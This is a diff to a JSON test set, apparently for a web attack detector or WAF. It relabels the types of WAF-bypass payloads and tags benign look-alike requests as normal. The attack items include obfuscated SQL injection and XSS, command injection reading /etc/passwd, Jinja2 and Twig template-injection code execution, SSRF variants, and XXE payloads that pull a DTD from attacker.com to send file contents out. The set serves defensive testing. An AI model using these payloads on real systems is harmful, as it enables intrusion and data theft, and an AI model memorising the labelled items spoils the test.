@@ -1745,7 +1745,7 @@
     "subcategory": "WAF专项/组合攻击绕过",
     "payload": "1'/**/UNION/**/SEL/**/ECT/**/NULL--",
     "description": "分块传输 SQLi",
-    "expected_type": "变体",
+    "expected_type": "SQL注入",
     "expected_vulnerable": true,
     "difficulty": "hard"
   },
@@ -1755,7 +1755,7 @@
     "subcategory": "WAF专项/组合攻击绕过",
     "payload": "<scr/**/ipt>al/**/ert(1)</scr/**/ipt>",
     "description": "分块传输 XSS",
-    "expected_type": "变体",
+    "expected_type": "XSS",
     "expected_vulnerable": true,
     "difficulty": "hard"
   },
@@ -1765,7 +1765,7 @@
     "subcategory": "WAF专项/组合攻击绕过",
     "payload": "127.0.0.1;c/**/at /etc/passwd",
     "description": "分块传输 CMDi",
-    "expected_type": "变体",
+    "expected_type": "命令注入",
     "expected_vulnerable": true,
     "difficulty": "hard"
   },
@@ -1775,7 +1775,7 @@
     "subcategory": "WAF专项/组合攻击绕过",
     "payload": "id=1&id=1' OR 1=1--",
     "description": "HTTP参数污染",
-    "expected_type": "变体",
+    "expected_type": "SQL注入",
     "expected_vulnerable": true,
     "difficulty": "hard"
   },
@@ -1785,7 +1785,7 @@
     "subcategory": "WAF专项/组合攻击绕过",
     "payload": "%25252525252527252525252520OR%252525252525201%2525252525253D1",
     "description": "七层编码 SQLi",
-    "expected_type": "变体",
+    "expected_type": "SQL注入",
     "expected_vulnerable": true,
     "difficulty": "hard"
   },
@@ -1795,7 +1795,7 @@
     "subcategory": "WAF专项/组合攻击绕过",
     "payload": "%2525253Cscript%2525253Ealert(1)%2525253C%2525252Fscript%2525253E",
     "description": "五层编码 XSS",
-    "expected_type": "变体",
+    "expected_type": "XSS",
     "expected_vulnerable": true,
     "difficulty": "hard"
   },
@@ -1805,7 +1805,7 @@
     "subcategory": "WAF专项/组合攻击绕过",
     "payload": "GET /?id=1' OR 1=1-- HTTP/1.1\nHost: attacker.com\nX-Forwarded-For: 1.1.1.1",
     "description": "Host头 SQLi",
-    "expected_type": "变体",
+    "expected_type": "SQL注入",
     "expected_vulnerable": true,
     "difficulty": "hard"
   },
@@ -1815,7 +1815,7 @@
     "subcategory": "WAF专项/组合攻击绕过",
     "payload": "POST / HTTP/1.1\nContent-Type: text/plain\n\na' OR 1=1--",
     "description": "Content-Type text/plain",
-    "expected_type": "变体",
+    "expected_type": "SQL注入",
     "expected_vulnerable": true,
     "difficulty": "hard"
   },
@@ -1825,7 +1825,7 @@
     "subcategory": "WAF专项/组合攻击绕过",
     "payload": "POST / HTTP/1.1\nContent-Type: multipart/form-data; boundary=x\n\n--x\n\na' OR 1=1--\n--x--",
     "description": "Content-Type multipart",
-    "expected_type": "变体",
+    "expected_type": "SQL注入",
     "expected_vulnerable": true,
     "difficulty": "hard"
   },
@@ -1835,18 +1835,18 @@
     "subcategory": "WAF专项/组合攻击绕过",
     "payload": "PUT /?id=1' OR 1=1-- HTTP/1.1",
     "description": "PUT方法 SQLi",
-    "expected_type": "变体",
+    "expected_type": "SQL注入",
     "expected_vulnerable": true,
     "difficulty": "hard"
   },
   {
     "id": "adv_waf_011",
-    "category": "WAF绕过/综合",
+    "category": "正常请求",
     "subcategory": "WAF专项/组合攻击绕过",
     "payload": "OPTIONS / HTTP/1.1",
     "description": "OPTIONS方法 探测",
-    "expected_type": "变体",
-    "expected_vulnerable": true,
+    "expected_type": "正常请求",
+    "expected_vulnerable": false,
     "difficulty": "hard"
   },
   {
@@ -1855,7 +1855,7 @@
     "subcategory": "WAF专项/组合攻击绕过",
     "payload": "1'/**/ORDER/**/BY/**/1--",
     "description": "fragment绕过 SQLi",
-    "expected_type": "变体",
+    "expected_type": "SQL注入",
     "expected_vulnerable": true,
     "difficulty": "hard"
   },
@@ -1865,7 +1865,7 @@
     "subcategory": "WAF专项/组合攻击绕过",
     "payload": "GET / HTTP/1.1\nTransfer-Encoding: chunked\n\n1\n1\n0\n\n",
     "description": "Transfer-Encoding chunked",
-    "expected_type": "变体",
+    "expected_type": "综合绕过",
     "expected_vulnerable": true,
     "difficulty": "hard"
   },
@@ -1875,7 +1875,7 @@
     "subcategory": "WAF专项/组合攻击绕过",
     "payload": "1' OR 1=1 UNION SELECT '<script>alert(1)</script>'--",
     "description": "SQLi + XSS",
-    "expected_type": "变体",
+    "expected_type": "SQL注入",
     "expected_vulnerable": true,
     "difficulty": "hard"
   },
@@ -1885,7 +1885,7 @@
     "subcategory": "WAF专项/组合攻击绕过",
     "payload": "127.0.0.1; SELECT * FROM users; cat /etc/passwd",
     "description": "CMDi + SQLi",
-    "expected_type": "变体",
+    "expected_type": "命令注入",
     "expected_vulnerable": true,
     "difficulty": "hard"
   },
@@ -1895,7 +1895,7 @@
     "subcategory": "WAF专项/组合攻击绕过",
     "payload": "{\"username\": {\"$gt\": \"\"}, \"password\": {\"$gt\": \"\"}}",
     "description": "MongoDB $gt",
-    "expected_type": "变体",
+    "expected_type": "NoSQL注入",
     "expected_vulnerable": true,
     "difficulty": "hard"
   },
@@ -1905,7 +1905,7 @@
     "subcategory": "WAF专项/组合攻击绕过",
     "payload": "{\"username\": {\"$regex\": \"admin.*\"}, \"password\": {\"$ne\": \"\"}}",
     "description": "MongoDB $regex",
-    "expected_type": "变体",
+    "expected_type": "NoSQL注入",
     "expected_vulnerable": true,
     "difficulty": "hard"
   },
@@ -1915,7 +1915,7 @@
     "subcategory": "WAF专项/组合攻击绕过",
     "payload": "{\"$where\": \"sleep(5000)\"}",
     "description": "MongoDB $where",
-    "expected_type": "变体",
+    "expected_type": "NoSQL注入",
     "expected_vulnerable": true,
     "difficulty": "hard"
   },
@@ -1925,7 +1925,7 @@
     "subcategory": "WAF专项/组合攻击绕过",
     "payload": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
     "description": "SSTI Jinja2",
-    "expected_type": "变体",
+    "expected_type": "SSTI",
     "expected_vulnerable": true,
     "difficulty": "hard"
   },
@@ -1935,7 +1935,7 @@
     "subcategory": "WAF专项/组合攻击绕过",
     "payload": "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
     "description": "SSTI Twig",
-    "expected_type": "变体",
+    "expected_type": "SSTI",
     "expected_vulnerable": true,
     "difficulty": "hard"
   },
@@ -1945,7 +1945,7 @@
     "subcategory": "WAF专项/组合攻击绕过",
     "payload": "http://127.0.0.1:8080/admin",
     "description": "SSRF localhost",
-    "expected_type": "变体",
+    "expected_type": "SSRF",
     "expected_vulnerable": true,
     "difficulty": "hard"
   },
@@ -1955,7 +1955,7 @@
     "subcategory": "WAF专项/组合攻击绕过",
     "payload": "http://2130706433:8080/admin",
     "description": "SSRF 十进制IP",
-    "expected_type": "变体",
+    "expected_type": "SSRF",
     "expected_vulnerable": true,
     "difficulty": "hard"
   },
@@ -1965,7 +1965,7 @@
     "subcategory": "WAF专项/组合攻击绕过",
     "payload": "http://[::1]:8080/admin",
     "description": "SSRF IPv6",
-    "expected_type": "变体",
+    "expected_type": "SSRF",
     "expected_vulnerable": true,
     "difficulty": "hard"
   },
@@ -1975,7 +1975,7 @@
     "subcategory": "WAF专项/组合攻击绕过",
     "payload": "http://1.1.1.1@127.0.0.1:8080/admin",
     "description": "SSRF DNS重绑定",
-    "expected_type": "变体",
+    "expected_type": "SSRF",
     "expected_vulnerable": true,
     "difficulty": "hard"
   },
@@ -1985,7 +1985,7 @@
     "subcategory": "WAF专项/组合攻击绕过",
     "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
     "description": "XXE 基础",
-    "expected_type": "变体",
+    "expected_type": "XXE",
     "expected_vulnerable": true,
     "difficulty": "hard"
   },
@@ -1995,7 +1995,7 @@
     "subcategory": "WAF专项/组合攻击绕过",
     "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\">%xxe;]>",
     "description": "XXE 参数实体",
-    "expected_type": "变体",
+    "expected_type": "XXE",
     "expected_vulnerable": true,
     "difficulty": "hard"
   },
@@ -2005,7 +2005,7 @@
     "subcategory": "WAF专项/组合攻击绕过",
     "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % start \"<![CDATA[\"><!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % end \"]]>\"><!ENTITY % dtd SYSTEM \"http://attacker.com/combine.dtd\">%dtd;]>",
     "description": "XXE CDATA",
-    "expected_type": "变体",
+    "expected_type": "XXE",
     "expected_vulnerable": true,
     "difficulty": "hard"
   },
@@ -2015,7 +2015,7 @@
     "subcategory": "WAF专项/组合攻击绕过",
     "payload": "1' OR 1=1-- (在 User-Agent 头中)",
     "description": "UserAgent SQLi",
-    "expected_type": "变体",
+    "expected_type": "SQL注入",
     "expected_vulnerable": true,
     "difficulty": "hard"
   },
@@ -2025,7 +2025,7 @@
     "subcategory": "WAF专项/组合攻击绕过",
     "payload": "1' OR SLEEP(5)-- (在 Referer 头中)",
     "description": "Referer SQLi",
-    "expected_type": "变体",
+    "expected_type": "SQL注入",
     "expected_vulnerable": true,
     "difficulty": "hard"
   },
@@ -2035,7 +2035,7 @@
     "subcategory": "WAF专项/组合攻击绕过",
     "payload": "1' UNION SELECT NULL-- (在 Cookie 头中)",
     "description": "Cookie 注入",
-    "expected_type": "变体",
+    "expected_type": "SQL注入",
     "expected_vulnerable": true,
     "difficulty": "hard"
   },
@@ -2045,7 +2045,7 @@
     "subcategory": "WAF专项/组合攻击绕过",
     "payload": "1' AND 1=1-- (在 X-Forwarded-For 头中)",
     "description": "X-Forwarded-For SQLi",
-    "expected_type": "变体",
+    "expected_type": "SQL注入",
     "expected_vulnerable": true,
     "difficulty": "hard"
   },
@@ -2055,7 +2055,7 @@
     "subcategory": "WAF专项/组合攻击绕过",
     "payload": "1' OR '1'='1' UNION SELECT NULL--\nUser-Agent: <script>alert(1)</script>",
     "description": "混合SQLi+Header",
-    "expected_type": "变体",
+    "expected_type": "SQL注入",
     "expected_vulnerable": true,
     "difficulty": "hard"
   },
@@ -2066,7 +2066,8 @@
     "payload": "q=how+to+use+UNION+in+SQL+tutorial",
     "description": "搜索SQL教程，含UNION关键字",
     "expected_vulnerable": false,
-    "difficulty": "easy"
+    "difficulty": "easy",
+    "expected_type": "正常请求"
   },
   {
     "id": "ben_sqli_002",
@@ -2075,7 +2076,8 @@
     "payload": "comment=I+love+OR+AND+NOT+logic+gates",
     "description": "评论含SQL布尔关键字",
     "expected_vulnerable": false,
-    "difficulty": "easy"
+    "difficulty": "easy",
+    "expected_type": "正常请求"
   },
   {
     "id": "ben_sqli_003",
@@ -2084,7 +2086,8 @@
     "payload": "search=SELECT+*+FROM+table+syntax+explained",
     "description": "搜索SQL语法文档",
     "expected_vulnerable": false,
-    "difficulty": "medium"
+    "difficulty": "medium",
+    "expected_type": "正常请求"
   },
   {
     "id": "ben_sqli_004",
@@ -2093,7 +2096,8 @@
     "payload": "bio=I%27m+a+database+administrator",
     "description": "URL编码的单引号(正常使用)",
     "expected_vulnerable": false,
-    "difficulty": "medium"
+    "difficulty": "medium",
+    "expected_type": "正常请求"
   },
   {
     "id": "ben_sqli_005",
@@ -2102,7 +2106,8 @@
     "payload": "token=d3d3LmV4YW1wbGUuY29tL2xvZ2lu",
     "description": "Base64编码的正常URL",
     "expected_vulnerable": false,
-    "difficulty": "hard"
+    "difficulty": "hard",
+    "expected_type": "正常请求"
   },
   {
     "id": "ben_sqli_006",
@@ -2111,7 +2116,8 @@
     "payload": "msg=you+have+1+new+message+%26+2+notifications",
     "description": "URL编码的&符号(正常通知)",
     "expected_vulnerable": false,
-    "difficulty": "medium"
+    "difficulty": "medium",
+    "expected_type": "正常请求"
   },
   {
     "id": "ben_sqli_007",
@@ -2120,7 +2126,8 @@
     "payload": "id=12345678901234567890",
     "description": "长数字ID(非SQLi)",
     "expected_vulnerable": false,
-    "difficulty": "hard"
+    "difficulty": "hard",
+    "expected_type": "正常请求"
   },
   {
     "id": "ben_sqli_008",
@@ -2129,7 +2136,8 @@
     "payload": "q=%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9F%A5%E8%AF%A2",
     "description": "URL编码的中文(数据库查询)",
     "expected_vulnerable": false,
-    "difficulty": "medium"
+    "difficulty": "medium",
+    "expected_type": "正常请求"
   },
   {
     "id": "ben_xss_001",
@@ -2138,7 +2146,8 @@
     "payload": "q=javascript+tutorial+for+beginners+2025",
     "description": "搜索JavaScript教程",
     "expected_vulnerable": false,
-    "difficulty": "easy"
+    "difficulty": "easy",
+    "expected_type": "正常请求"
   },
   {
     "id": "ben_xss_002",
@@ -2147,7 +2156,8 @@
     "payload": "content=%3Cdiv+class%3D%22container%22%3EHello%3C%2Fdiv%3E",
     "description": "URL编码的合法HTML片段",
     "expected_vulnerable": false,
-    "difficulty": "easy"
+    "difficulty": "easy",
+    "expected_type": "正常请求"
   },
   {
     "id": "ben_xss_003",
@@ -2156,7 +2166,8 @@
     "payload": "title=How+to+use+%3Cscript%3E+tag+in+HTML",
     "description": "讨论HTML script标签用法",
     "expected_vulnerable": false,
-    "difficulty": "medium"
+    "difficulty": "medium",
+    "expected_type": "正常请求"
   },
   {
     "id": "ben_xss_004",
@@ -2165,7 +2176,8 @@
     "payload": "signature=%3Cb%3EJohn+Doe%3C%2Fb%3E+-+CEO",
     "description": "签名中的加粗标签",
     "expected_vulnerable": false,
-    "difficulty": "medium"
+    "difficulty": "medium",
+    "expected_type": "正常请求"
   },
   {
     "id": "ben_xss_005",
@@ -2174,7 +2186,8 @@
     "payload": "bio=%26lt%3Bdiv%26gt%3B+is+an+HTML+element",
     "description": "HTML实体用于教学文本",
     "expected_vulnerable": false,
-    "difficulty": "hard"
+    "difficulty": "hard",
+    "expected_type": "正常请求"
   },
   {
     "id": "ben_xss_006",
@@ -2183,7 +2196,8 @@
     "payload": "description=The+onclick+event+triggers+on+mouse+click",
     "description": "讨论onclick事件(纯文本)",
     "expected_vulnerable": false,
-    "difficulty": "medium"
+    "difficulty": "medium",
+    "expected_type": "正常请求"
   },
   {
     "id": "ben_xss_007",
@@ -2192,7 +2206,8 @@
     "payload": "code=x3Cscriptx3E+is+used+in+tests",
     "description": "Unicode编码的正常讨论",
     "expected_vulnerable": false,
-    "difficulty": "hard"
+    "difficulty": "hard",
+    "expected_type": "正常请求"
   },
   {
     "id": "ben_xss_008",
@@ -2201,7 +2216,8 @@
     "payload": "icon=%3Csvg+width%3D24+height%3D24%3E%3C%2Fsvg%3E",
     "description": "合法SVG图标数据",
     "expected_vulnerable": false,
-    "difficulty": "hard"
+    "difficulty": "hard",
+    "expected_type": "正常请求"
   },
   {
     "id": "ben_cmdi_001",
@@ -2210,7 +2226,8 @@
     "payload": "q=linux+cat+command+tutorial+%26+grep+examples",
     "description": "搜索Linux命令教程",
     "expected_vulnerable": false,
-    "difficulty": "easy"
+    "difficulty": "easy",
+    "expected_type": "正常请求"
   },
   {
     "id": "ben_cmdi_002",
@@ -2219,7 +2236,8 @@
     "payload": "note=To+check+logs+run%3A+cat+%2Fvar%2Flog%2Fsyslog",
     "description": "技术文档中的命令示例",
     "expected_vulnerable": false,
-    "difficulty": "medium"
+    "difficulty": "medium",
+    "expected_type": "正常请求"
   },
   {
     "id": "ben_cmdi_003",
@@ -2228,7 +2246,8 @@
     "payload": "input=option+a+%7C+option+b+%7C+option+c",
     "description": "竖线作为选项分隔符",
     "expected_vulnerable": false,
-    "difficulty": "medium"
+    "difficulty": "medium",
+    "expected_type": "正常请求"
   },
   {
     "id": "ben_cmdi_004",
@@ -2237,7 +2256,8 @@
     "payload": "filename=ping_backup_2025-07-22.tar.gz",
     "description": "文件名含ping关键字",
     "expected_vulnerable": false,
-    "difficulty": "hard"
+    "difficulty": "hard",
+    "expected_type": "正常请求"
   },
   {
     "id": "ben_cmdi_005",
@@ -2246,7 +2266,8 @@
     "payload": "message=nc+is+short+for+netcat+tool",
     "description": "讨论netcat工具(纯文本)",
     "expected_vulnerable": false,
-    "difficulty": "hard"
+    "difficulty": "hard",
+    "expected_type": "正常请求"
   },
   {
     "id": "ben_cmdi_006",
@@ -2255,7 +2276,8 @@
     "payload": "data=d2hvYW1p+ZWNobyAiaGVsbG8i",
     "description": "截断的Base64(非注入)",
     "expected_vulnerable": false,
-    "difficulty": "hard"
+    "difficulty": "hard",
+    "expected_type": "正常请求"
   },
   {
     "id": "ben_lfi_001",
@@ -2264,7 +2286,8 @@
     "payload": "path=../public/images/logo.png",
     "description": "相对路径引用静态资源",
     "expected_vulnerable": false,
-    "difficulty": "easy"
+    "difficulty": "easy",
+    "expected_type": "正常请求"
   },
   {
     "id": "ben_lfi_002",
@@ -2273,7 +2296,8 @@
     "payload": "template=../../templates/email/welcome.html",
     "description": "模板引擎相对路径",
     "expected_vulnerable": false,
-    "difficulty": "medium"
+    "difficulty": "medium",
+    "expected_type": "正常请求"
   },
   {
     "id": "ben_lfi_003",
@@ -2282,7 +2306,8 @@
     "payload": "file=report.pdf%00backup.bak",
     "description": "Null截断的正常文件名",
     "expected_vulnerable": false,
-    "difficulty": "hard"
+    "difficulty": "hard",
+    "expected_type": "正常请求"
   },
   {
     "id": "ben_lfi_004",
@@ -2291,7 +2316,8 @@
     "payload": "dir=%2e%2e%2f%2e%2e%2fshared%2fconfig.json",
     "description": "URL编码的相对路径(配置访问)",
     "expected_vulnerable": false,
-    "difficulty": "hard"
+    "difficulty": "hard",
+    "expected_type": "正常请求"
   },
   {
     "id": "ben_web_001",
@@ -2300,7 +2326,8 @@
     "payload": "{\"url\":\"https://api.github.com/repos/lauyy32/repos\"}",
     "description": "正常API URL请求",
     "expected_vulnerable": false,
-    "difficulty": "easy"
+    "difficulty": "easy",
+    "expected_type": "正常请求"
   },
   {
     "id": "ben_web_002",
@@ -2309,7 +2336,8 @@
     "payload": "webhook=http://localhost:8080/health",
     "description": "本地健康检查webhook",
     "expected_vulnerable": false,
-    "difficulty": "medium"
+    "difficulty": "medium",
+    "expected_type": "正常请求"
   },
   {
     "id": "ben_web_003",
@@ -2318,7 +2346,8 @@
     "payload": "<?xml version=\"1.0\"?><note><to>Tove</to></note>",
     "description": "合法XML文档推送",
     "expected_vulnerable": false,
-    "difficulty": "medium"
+    "difficulty": "medium",
+    "expected_type": "正常请求"
   },
   {
     "id": "ben_web_004",
@@ -2327,7 +2356,8 @@
     "payload": "filename=report.php.pdf",
     "description": "php.pdf文件名(非PHP文件)",
     "expected_vulnerable": false,
-    "difficulty": "hard"
+    "difficulty": "hard",
+    "expected_type": "正常请求"
   },
   {
     "id": "ben_web_005",
@@ -2336,7 +2366,8 @@
     "payload": "redirect=https%3A%2F%2Fexample.com%2Flogin",
     "description": "正常OAuth redirect_uri",
     "expected_vulnerable": false,
-    "difficulty": "hard"
+    "difficulty": "hard",
+    "expected_type": "正常请求"
   },
   {
     "id": "ben_misc_001",
@@ -2345,7 +2376,8 @@
     "payload": "input=hello%26world%27s+data+%3Cb%3Etest%3C%2Fb%3E",
     "description": "混合特殊字符的正常文本",
     "expected_vulnerable": false,
-    "difficulty": "medium"
+    "difficulty": "medium",
+    "expected_type": "正常请求"
   },
   {
     "id": "ben_misc_002",
@@ -2354,7 +2386,8 @@
     "payload": "json={\"search\":\"SELECT 1 FROM dual\",\"page\":1}",
     "description": "JSON中嵌SQL示例文本",
     "expected_vulnerable": false,
-    "difficulty": "hard"
+    "difficulty": "hard",
+    "expected_type": "正常请求"
   },
   {
     "id": "ben_misc_003",
@@ -2363,7 +2396,8 @@
     "payload": "data=SGVsbG8gV29ybGQhIEkgYW0gYSBub3JtYWwgdXNlci4=",
     "description": "Base64编码的Hello World",
     "expected_vulnerable": false,
-    "difficulty": "hard"
+    "difficulty": "hard",
+    "expected_type": "正常请求"
   },
   {
     "id": "ben_misc_004",
@@ -2372,7 +2406,8 @@
     "payload": "name=\\u004a\\u006f\\u0068\\u006e\\u0020\\u0044\\u006f\\u0065",
     "description": "Unicode转义的正常姓名(John Doe)",
     "expected_vulnerable": false,
-    "difficulty": "hard"
+    "difficulty": "hard",
+    "expected_type": "正常请求"
   },
   {
     "id": "ben_misc_005",
@@ -2381,7 +2416,8 @@
     "payload": "color=0xDEADBEEF&type=0xCAFEBABE",
     "description": "十六进制颜色/魔数(非注入)",
     "expected_vulnerable": false,
-    "difficulty": "medium"
+    "difficulty": "medium",
+    "expected_type": "正常请求"
   },
   {
     "id": "ben_misc_006",
@@ -2390,7 +2426,8 @@
     "payload": "query=SELECT+1%3B+SELECT+2%3B+COMMIT%3B",
     "description": "SQL教学多语句示例",
     "expected_vulnerable": false,
-    "difficulty": "hard"
+    "difficulty": "hard",
+    "expected_type": "正常请求"
   },
   {
     "id": "ben_misc_007",
@@ -2399,7 +2436,8 @@
     "payload": "template=Hello+{{username}}+welcome+to+our+site",
     "description": "Mustache模板语法(非SSTI攻击)",
     "expected_vulnerable": false,
-    "difficulty": "hard"
+    "difficulty": "hard",
+    "expected_type": "正常请求"
   },
   {
     "id": "ben_misc_008",
@@ -2408,7 +2446,8 @@
     "payload": "{\"query\":{\"$gt\":\"\"},\"fields\":[\"name\",\"email\"]}",
     "description": "MongoDB合法查询操作符",
     "expected_vulnerable": false,
-    "difficulty": "hard"
+    "difficulty": "hard",
+    "expected_type": "正常请求"
   },
   {
     "id": "ben_misc_009",
@@ -2417,6 +2456,7 @@
     "payload": "text=%E6%B3%A8%E5%85%A5+%E6%BC%8F%E6%B4%9E+%E6%A3%80%E6%B5%8B+%E6%8A%80%E6%9C%AF",
     "description": "URL编码中文(注入漏洞检测技术)",
     "expected_vulnerable": false,
-    "difficulty": "easy"
+    "difficulty": "easy",
+    "expected_type": "正常请求"
   }
 ]
